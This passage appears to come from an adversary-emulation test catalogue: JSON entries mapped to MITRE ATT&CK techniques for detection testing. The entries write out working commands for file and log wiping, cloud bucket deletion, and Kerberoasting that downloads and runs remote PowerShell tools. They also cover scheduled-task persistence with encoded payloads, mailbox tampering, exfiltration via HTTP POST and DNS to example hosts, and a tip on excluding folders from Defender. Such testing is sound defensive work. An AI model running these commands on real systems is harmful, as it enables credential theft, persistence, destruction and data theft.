			"command": "if (-not (Test-Path \"#{file_to_delete}\")) { New-Item \"#{file_to_delete}\" -Force }\n& \"#{sdelete_exe}\" -accepteula \"#{file_to_delete}\"\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1485",
		"phases": ["impact"]
	},
	{
		"name": "FreeBSD/macOS/Linux - Overwrite file with DD",
		"auto_generated_guid": "38deee99-fd65-4031-bec8-bfa4f9f26146",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"overwrite_source": {
				"description": "Path of data source to overwrite with",
				"type": "path",
				"default": "/dev/zero"
			},
			"file_to_overwrite": {
				"description": "Path of file to overwrite and remove",
				"type": "path",
				"default": "/var/log/syslog"
			}
		},
		"executor": {
			"command": "dd of=#{file_to_overwrite} if=#{overwrite_source} count=$(ls -l #{file_to_overwrite} | awk '{print $5}') iflag=count_bytes\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1485",
		"phases": ["impact"]
	},
	{
		"name": "Overwrite deleted data on C drive",
		"auto_generated_guid": "321fd25e-0007-417f-adec-33232252be19",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "cipher.exe /w:C:\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1485",
		"phases": ["impact"]
	},
	{
		"name": "GCP - Delete Bucket",
		"auto_generated_guid": "4ac71389-40f4-448a-b73f-754346b3f928",
		"supported_platforms": ["iaas:gcp"],
		"input_arguments": {
			"project_id": {
				"description": "ID of the GCP Project you to execute the command against.",
				"type": "string",
				"default": "atomic-test-1"
			},
			"bucket_name": {
				"description": "The name of the bucket to delete.",
				"type": "string",
				"default": "atomic-red-team-bucket"
			}
		},
		"executor": {
			"name": "sh",
			"elevation_required": false,
			"command": "gcloud config set project #{project_id}\ngcloud storage buckets delete gs://#{bucket_name}\n",
			"cleanup_command": "cd \"$PathToAtomicsFolder/T1485/src/T1485-4/\"\nterraform state rm google_storage_bucket.bucket\nterraform destroy -auto-approve\n"
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Requires gcloud\n",
				"prereq_command": "if [ -x \"$(command -v gcloud)\" ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "echo \"Please Install Google Cloud SDK before running this atomic test : https://cloud.google.com/sdk/docs/install\"\n"
			},
			{
				"description": "Check if user is logged in \n",
				"prereq_command": "gcloud config get-value account\n",
				"get_prereq_command": "gcloud auth login --no-launch-browser\n"
			},
			{
				"description": "Check if terraform is installed.\n",
				"prereq_command": "terraform version\n",
				"get_prereq_command": "echo Please install the terraform.\n"
			},
			{
				"description": "Create dependency resources using terraform\n",
				"prereq_command": "stat \"$PathToAtomicsFolder/T1485/src/T1485-4/terraform.tfstate\"\n",
				"get_prereq_command": "cd \"$PathToAtomicsFolder/T1485/src/T1485-4/\"\nterraform init\nterraform apply -auto-approve"
			}
		],
		"attack_technique": "T1485",
		"phases": ["impact"]
	},
	{
		"name": "Request for service tickets",
		"auto_generated_guid": "3f987809-3681-43c8-bcd8-b3ff3a28533a",
		"supported_platforms": ["windows"],
		"dependencies": [
			{
				"description": "Computer must be domain joined\n",
				"prereq_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
				"get_prereq_command": "Write-Host Joining this computer to a domain must be done manually\n"
			}
		],
		"executor": {
			"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\niex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing)\nInvoke-Kerberoast | fl\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1558.003",
		"phases": ["credential-access"]
	},
	{
		"name": "Rubeus kerberoast",
		"auto_generated_guid": "14625569-6def-4497-99ac-8e7817105b55",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"local_folder": {
				"description": "Local path of Rubeus executable",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads"
			},
			"local_executable": {
				"description": "name of the rubeus executable",
				"type": "string",
				"default": "rubeus.exe"
			},
			"out_file": {
				"description": "file where command results are stored",
				"type": "string",
				"default": "rubeus_output.txt"
			},
			"rubeus_url": {
				"description": "URL of Rubeus executable",
				"type": "url",
				"default": "https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe"
			},
			"flags": {
				"description": "command flags you would like to run (optional and blank by default)",
				"type": "string",
				"default": null
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Computer must be domain joined\n",
				"prereq_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
				"get_prereq_command": "Write-Host Joining this computer to a domain must be done manually\n"
			},
			{
				"description": "Rubeus must exist\n",
				"prereq_command": "if(Test-Path -Path \"#{local_folder}\\#{local_executable}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-Webrequest -Uri #{rubeus_url} -OutFile \"#{local_folder}\\#{local_executable}\"\n"
			}
		],
		"executor": {
			"command": "klist purge\ncmd.exe /c \"#{local_folder}\\#{local_executable}\" kerberoast #{flags} /outfile:\"#{local_folder}\\#{out_file}\"\n",
			"cleanup_command": "Remove-Item \"#{local_folder}\\#{out_file}\" -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1558.003",
		"phases": ["credential-access"]
	},
	{
		"name": "Extract all accounts in use as SPN using setspn",
		"auto_generated_guid": "e6f4affd-d826-4871-9a62-6c9004b8fe06",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"domain_name": {
				"description": "The Domain Name to lookup against",
				"type": "string",
				"default": "%USERDNSDOMAIN%"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Computer must be domain joined\n",
				"prereq_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
				"get_prereq_command": "Write-Host Joining this computer to a domain must be done manually\n"
			}
		],
		"executor": {
			"command": "setspn -T #{domain_name} -Q */*\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1558.003",
		"phases": ["credential-access"]
	},
	{
		"name": "Request A Single Ticket via PowerShell",
		"auto_generated_guid": "988539bc-2ed7-4e62-aec6-7c5cf6680863",
		"supported_platforms": ["windows"],
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Computer must be domain joined\n",
				"prereq_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
				"get_prereq_command": "Write-Host Joining this computer to a domain must be done manually\n"
			}
		],
		"executor": {
			"command": "Add-Type -AssemblyName System.IdentityModel\n$ComputerFQDN=$env:LogonServer.trimStart('\\') + \".\" + $env:UserDnsDomain\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"HTTP/$ComputerFQDN\" \n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1558.003",
		"phases": ["credential-access"]
	},
	{
		"name": "Request All Tickets via PowerShell",
		"auto_generated_guid": "902f4ed2-1aba-4133-90f2-cff6d299d6da",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"domain_name": {
				"description": "The Domain Name to lookup against",
				"type": "string",
				"default": "%USERDNSDOMAIN%"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Computer must be domain joined\n",
				"prereq_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
				"get_prereq_command": "Write-Host Joining this computer to a domain must be done manually\n"
			}
		],
		"executor": {
			"command": "Add-Type -AssemblyName System.IdentityModel  \nsetspn.exe -T #{domain_name} -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  \n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1558.003",
		"phases": ["credential-access"]
	},
	{
		"name": "WinPwn - Kerberoasting",
		"auto_generated_guid": "78d10e20-c874-45f2-a9df-6fea0120ec27",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nKerberoasting -consoleoutput -noninteractive",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1558.003",
		"phases": ["credential-access"]
	},
	{
		"name": "WinPwn - PowerSharpPack - Kerberoasting Using Rubeus",
		"auto_generated_guid": "29094950-2c96-4cbd-b5e4-f7c65079678f",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')\nInvoke-Rubeus -Command \"kerberoast /format:hashcat /nowrap\"",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1558.003",
		"phases": ["credential-access"]
	},
	{
		"name": "Scheduled Task Startup Script",
		"auto_generated_guid": "fec27f65-db86-4c2d-b66c-61945aee87c2",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "schtasks /create /tn \"T1053_005_OnLogon\" /sc onlogon /tr \"cmd.exe /c calc.exe\"\nschtasks /create /tn \"T1053_005_OnStartup\" /sc onstart /ru system /tr \"cmd.exe /c calc.exe\"\n",
			"cleanup_command": "schtasks /delete /tn \"T1053_005_OnLogon\" /f >nul 2>&1\nschtasks /delete /tn \"T1053_005_OnStartup\" /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1053.005",
		"phases": ["execution", "persistence", "privilege-escalation"]
	},
	{
		"name": "Scheduled task Local",
		"auto_generated_guid": "42f53695-ad4a-4546-abb6-7d837f644a71",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"task_command": {
				"description": "What you want to execute",
				"type": "string",
				"default": "C:\\windows\\system32\\cmd.exe"
			},
			"time": {
				"description": "What time 24 Hour",
				"type": "string",
				"default": "20:10"
			}
		},
		"executor": {
			"name": "command_prompt",
			"elevation_required": false,
			"command": "SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}\n",
			"cleanup_command": "SCHTASKS /Delete /TN spawn /F >nul 2>&1\n"
		},
		"attack_technique": "T1053.005",
		"phases": ["execution", "persistence", "privilege-escalation"]
	},
	{
		"name": "Scheduled task Remote",
		"auto_generated_guid": "2e5eac3e-327b-4a88-a0c0-c4057039a8dd",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"task_command": {
				"description": "What you want to execute",
				"type": "string",
				"default": "C:\\windows\\system32\\cmd.exe"
			},
			"time": {
				"description": "What time 24 Hour",
				"type": "string",
				"default": "20:10"
			},
			"target": {
				"description": "Target",
				"type": "string",
				"default": "localhost"
			},
			"user_name": {
				"description": "Username to authenticate with, format: DOMAIN\\User",
				"type": "string",
				"default": "DOMAIN\\user"
			},
			"password": {
				"description": "Password to authenticate with",
				"type": "string",
				"default": "At0micStrong"
			}
		},
		"executor": {
			"name": "command_prompt",
			"elevation_required": true,
			"command": "SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN \"Atomic task\" /TR \"#{task_command}\" /SC daily /ST #{time}\n",
			"cleanup_command": "SCHTASKS /Delete /S #{target} /U #{user_name} /P #{password} /TN \"Atomic task\" /F >nul 2>&1\n"
		},
		"attack_technique": "T1053.005",
		"phases": ["execution", "persistence", "privilege-escalation"]
	},
	{
		"name": "Powershell Cmdlet Scheduled Task",
		"auto_generated_guid": "af9fd58f-c4ac-4bf2-a9ba-224b71ff25fd",
		"supported_platforms": ["windows"],
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "$Action = New-ScheduledTaskAction -Execute \"calc.exe\"\n$Trigger = New-ScheduledTaskTrigger -AtLogon\n$User = New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest\n$Set = New-ScheduledTaskSettingsSet\n$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set\nRegister-ScheduledTask AtomicTask -InputObject $object\n",
			"cleanup_command": "Unregister-ScheduledTask -TaskName \"AtomicTask\" -confirm:$false >$null 2>&1\n"
		},
		"attack_technique": "T1053.005",
		"phases": ["execution", "persistence", "privilege-escalation"]
	},
	{
		"name": "Task Scheduler via VBA",
		"auto_generated_guid": "ecd3fa21-7792-41a2-8726-2c5c673414d3",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"ms_product": {
				"description": "Maldoc application Word",
				"type": "string",
				"default": "Word"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Microsoft #{ms_product} must be installed\n",
				"prereq_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
				"get_prereq_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n"
			}
		],
		"executor": {
			"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\" -officeProduct \"#{ms_product}\" -sub \"Scheduler\"\n",
			"name": "powershell",
			"cleanup_command": "Unregister-ScheduledTask -TaskName \"Run Notepad\" -Confirm:$false\n",
			"elevation_required": false
		},
		"attack_technique": "T1053.005",
		"phases": ["execution", "persistence", "privilege-escalation"]
	},
	{
		"name": "WMI Invoke-CimMethod Scheduled Task",
		"auto_generated_guid": "e16b3b75-dc9e-4cde-a23d-dfa2d0507b3b",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"xml_path": {
				"description": "path of vbs to use when creating masquerading files",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1053.005\\src\\T1053_005_WMI.xml"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "File to copy must exist on disk at specified location (#{xml_path})\n",
				"prereq_command": "if (Test-Path \"#{xml_path}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{xml_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1053.005/src/T1053_005_WMI.xml\" -OutFile \"#{xml_path}\"\n"
			}
		],
		"executor": {
			"name": "powershell",
			"elevation_required": true,
			"command": "$xml = [System.IO.File]::ReadAllText(\"#{xml_path}\")\nInvoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \"Root\\Microsoft\\Windows\\TaskScheduler\" -MethodName \"RegisterByXml\" -Arguments @{ Force = $true; Xml =$xml; }\n",
			"cleanup_command": "Unregister-ScheduledTask -TaskName \"T1053_005_WMI\" -confirm:$false >$null 2>&1\n"
		},
		"attack_technique": "T1053.005",
		"phases": ["execution", "persistence", "privilege-escalation"]
	},
	{
		"name": "Scheduled Task Executing Base64 Encoded Commands From Registry",
		"auto_generated_guid": "e895677d-4f06-49ab-91b6-ae3742d0a2ba",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"time": {
				"description": "Daily scheduled task execution time",
				"type": "string",
				"default": "07:45"
			}
		},
		"executor": {
			"command": "reg add HKCU\\SOFTWARE\\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f\nschtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\ATOMIC-T1053.005).test)))\" /sc daily /st #{time}\n",
			"cleanup_command": "schtasks /delete /tn \"ATOMIC-T1053.005\" /F >nul 2>&1\nreg delete HKCU\\SOFTWARE\\ATOMIC-T1053.005 /F >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1053.005",
		"phases": ["execution", "persistence", "privilege-escalation"]
	},
	{
		"name": "Import XML Schedule Task with Hidden Attribute",
		"auto_generated_guid": "cd925593-fbb4-486d-8def-16cbdf944bf4",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"xml_path": {
				"description": "path of vbs to use when creating masquerading files",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1053.005\\src\\T1053_05_SCTASK_HIDDEN_ATTRIB.xml"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "File to copy must exist on disk at specified location (#{xml_path})\n",
				"prereq_command": "if (Test-Path \"#{xml_path}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{xml_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1053.005/src/T1053_05_SCTASK_HIDDEN_ATTRIB.xml\" -OutFile \"#{xml_path}\"\n"
			}
		],
		"executor": {
			"name": "powershell",
			"elevation_required": true,
			"command": "$xml = [System.IO.File]::ReadAllText(\"#{xml_path}\")\nInvoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \"Root\\Microsoft\\Windows\\TaskScheduler\" -MethodName \"RegisterByXml\" -Arguments @{ Force = $true; Xml =$xml; }\n",
			"cleanup_command": "Unregister-ScheduledTask -TaskName \"atomic red team\" -confirm:$false >$null 2>&1\n"
		},
		"attack_technique": "T1053.005",
		"phases": ["execution", "persistence", "privilege-escalation"]
	},
	{
		"name": "PowerShell Modify A Scheduled Task",
		"auto_generated_guid": "dda6fc7b-c9a6-4c18-b98d-95ec6542af6d",
		"supported_platforms": ["windows"],
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "$Action = New-ScheduledTaskAction -Execute \"cmd.exe\"\n$Trigger = New-ScheduledTaskTrigger -AtLogon\n$User = New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest\n$Set = New-ScheduledTaskSettingsSet\n$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set\nRegister-ScheduledTask AtomicTaskModifed -InputObject $object\n$NewAction = New-ScheduledTaskAction -Execute \"Notepad.exe\"\nSet-ScheduledTask \"AtomicTaskModifed\" -Action $NewAction\n",
			"cleanup_command": "Unregister-ScheduledTask -TaskName \"AtomicTaskModifed\" -confirm:$false >$null 2>&1\n"
		},
		"attack_technique": "T1053.005",
		"phases": ["execution", "persistence", "privilege-escalation"]
	},
	{
		"name": "Scheduled Task (\"Ghost Task\") via Registry Key Manipulation",
		"auto_generated_guid": "704333ca-cc12-4bcf-9916-101844881f54",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"task_name": {
				"description": "Name of the newly-added task",
				"type": "string",
				"default": "lilghostie"
			},
			"task_command": {
				"description": "Command you want the task to execute",
				"type": "string",
				"default": "notepad.exe"
			},
			"target": {
				"description": "System where the task should run",
				"type": "string",
				"default": "localhost"
			},
			"user_name": {
				"description": "Username to authenticate with, such as ATOMICDOMAIN\\AtomicAdmin",
				"type": "string",
				"default": "$env:USERDOMAIN + '\\' + $env:USERNAME"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "PsExec tool from Sysinternals must exist in the ExternalPayloads directory\n",
				"prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\") { exit 0} else { exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\" -Force\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\\PsExec.exe\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" -Force\n"
			},
			{
				"description": "GhostTask.exe tool from netero101 must exist in the ExternalPayloads directory. This tool may be quarantined by windows defender; disable windows defender real-time protection to fix it or add the ExternalPayloads directory as an exclusion, using a command like `Add-MpPreference -ExclusionPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\\"`\n",
				"prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\GhostTask.exe\") { exit 0} else { exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/netero1010/GhostTask/releases/download/1.0/GhostTask.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\GhostTask.exe\"\n"
			}
		],
		"executor": {
			"name": "command_prompt",
			"elevation_required": true,
			"command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" \\\\#{target} -accepteula -s \"cmd.exe\"\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\GhostTask.exe\" \\\\#{target} add #{task_name} \"cmd.exe\" \"/c #{task_command}\" #{user_name} logon\n",
			"cleanup_command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" \\\\#{target} -accepteula -s \"cmd.exe\"\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\GhostTask.exe\" \\\\#{target} delete #{task_name} > nul"
		},
		"attack_technique": "T1053.005",
		"phases": ["execution", "persistence", "privilege-escalation"]
	},
	{
		"name": "Copy and Delete Mailbox Data on Windows",
		"auto_generated_guid": "d29f01ea-ac72-4efc-8a15-bea64b77fabf",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "New-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -ItemType Directory -ErrorAction Ignore\nGet-ChildItem -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore }\nRemove-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore\n",
			"cleanup_command": "Remove-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1070.008",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Copy and Delete Mailbox Data on Linux",
		"auto_generated_guid": "25e2be0e-96f7-4417-bd16-a4a2500e3802",
		"supported_platforms": ["linux"],
		"executor": {
			"command": "mkdir -p /var/spool/mail/copy\nfor file in /var/spool/mail/*; do\n  if [ \"$(basename \"$file\")\" != \"copy\" ]\n  then\n    cp -R \"$file\" /var/spool/mail/copy/\n  fi\ndone\nrm -rf /var/spool/mail/copy/*\n",
			"cleanup_command": "rm -rf /var/spool/mail/copy\n",
			"name": "bash",
			"elevation_required": true
		},
		"attack_technique": "T1070.008",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Copy and Delete Mailbox Data on macOS",
		"auto_generated_guid": "3824130e-a6e4-4528-8091-3a52eeb540f6",
		"supported_platforms": ["macos"],
		"executor": {
			"command": "mkdir ~/Library/Mail/copy\ncp -R ~/Library/Mail/* ~/Library/Mail/copy\nrm -rf ~/Library/Mail/copy/*\n",
			"cleanup_command": "rm -rf ~/Library/Mail/copy\n",
			"name": "bash",
			"elevation_required": true
		},
		"attack_technique": "T1070.008",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Copy and Modify Mailbox Data on Windows",
		"auto_generated_guid": "edddff85-fee0-499d-9501-7d4d2892e79b",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "New-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -ItemType Directory -ErrorAction Ignore\nGet-ChildItem -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore }\nGet-ChildItem -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -File | ForEach-Object { Add-Content -Path $_.FullName -Value \"Modification for Atomic Red Test\" -ErrorAction Ignore }\n",
			"cleanup_command": "Remove-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1070.008",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Copy and Modify Mailbox Data on Linux",
		"auto_generated_guid": "6d99f93c-da56-49e3-b195-163090ace4f6",
		"supported_platforms": ["linux"],
		"executor": {
			"command": "mkdir -p /var/spool/mail/copy\nfor file in /var/spool/mail/*; do\n  if [ \"$(basename \"$file\")\" != \"copy\" ]\n  then\n    cp -R \"$file\" /var/spool/mail/copy/\n    if [ -f \"/var/spool/mail/copy/$(basename \"$file\")\" ]; then\n      echo \"Modification for Atomic Red Test\" >> \"/var/spool/mail/copy/$(basename \"$file\")\"\n    fi\n  fi\ndone\n",
			"cleanup_command": "rm -rf /var/spool/mail/copy\n",
			"name": "bash",
			"elevation_required": true
		},
		"attack_technique": "T1070.008",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Copy and Modify Mailbox Data on macOS",
		"auto_generated_guid": "8a0b1579-5a36-483a-9cde-0236983e1665",
		"supported_platforms": ["macos"],
		"executor": {
			"command": "mkdir ~/Library/Mail/copy\ncp -R ~/Library/Mail/* ~/Library/Mail/copy\necho \"Manipulated data\" > ~/Library/Mail/copy/manipulated.txt\n",
			"cleanup_command": "rm -rf ~/Library/Mail/copy\n",
			"name": "bash",
			"elevation_required": true
		},
		"attack_technique": "T1070.008",
		"phases": ["defense-evasion"]
	},
	{
		"name": "WINWORD Remote Template Injection",
		"auto_generated_guid": "1489e08a-82c7-44ee-b769-51b72d03521d",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"docx_file": {
				"description": "Location of the test docx file on the local filesystem.",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1221\\src\\Calculator.docx"
			}
		},
		"executor": {
			"command": "start \"#{docx_file}\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1221",
		"phases": ["defense-evasion"]
	},
	{
		"name": "C2 Data Exfiltration",
		"auto_generated_guid": "d1253f6e-c29b-49dc-b466-2147a6191932",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"destination_url": {
				"description": "Destination URL to post encoded data.",
				"type": "string",
				"default": "example.com"
			},
			"filepath": {
				"description": "The file which is being exfiltrated to the C2 Server.",
				"type": "path",
				"default": "$env:TEMP\\LineNumbers.txt"
			}
		},
		"executor": {
			"command": "if(-not (Test-Path #{filepath})){ \n  1..100 | ForEach-Object { Add-Content -Path #{filepath} -Value \"This is line $_.\" }\n}\n[System.Net.ServicePointManager]::Expect100Continue = $false\n$filecontent = Get-Content -Path #{filepath}\nInvoke-WebRequest -Uri #{destination_url} -Method POST -Body $filecontent -DisableKeepAlive\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1041",
		"phases": ["exfiltration"]
	},
	{
		"name": "Text Based Data Exfiltration using DNS subdomains",
		"auto_generated_guid": "c9207f3e-213d-4cc7-ad2a-7697a7237df9",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"dns_server": {
				"description": "DNS server IP address or domain name.",
				"type": "url",
				"default": "dns.example.com"
			},
			"exfiltrated_data": {
				"description": "Data to be exfiltrated.",
				"type": "string",
				"default": "SecretDataToExfiltrate"
			},
			"chunk_size": {
				"description": "Size of each DNS query chunk (in characters).",
				"type": "integer",
				"default": 63
			}
		},
		"executor": {
			"command": "$dnsServer = \"#{dns_server}\"\n$exfiltratedData = \"#{exfiltrated_data}\"\n$chunkSize = #{chunk_size}\n\n$encodedData = [System.Text.Encoding]::UTF8.GetBytes($exfiltratedData)\n$encodedData = [Convert]::ToBase64String($encodedData)\n$chunks = $encodedData -split \"(.{$chunkSize})\"\n\nforeach ($chunk in $chunks) {\n    $dnsQuery = $chunk + \".\" + $dnsServer\n    Resolve-DnsName -Name $dnsQuery\n    Start-Sleep -Seconds 5\n}\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1041",
		"phases": ["exfiltration"]
	},
	{
		"name": "Device Driver Discovery",
		"auto_generated_guid": "235b30a2-e5b1-441f-9705-be6231c88ddd",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "driverquery /v /fo list\ndriverquery /si /fo list\n",
			"cleanup_command": null,
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1652",
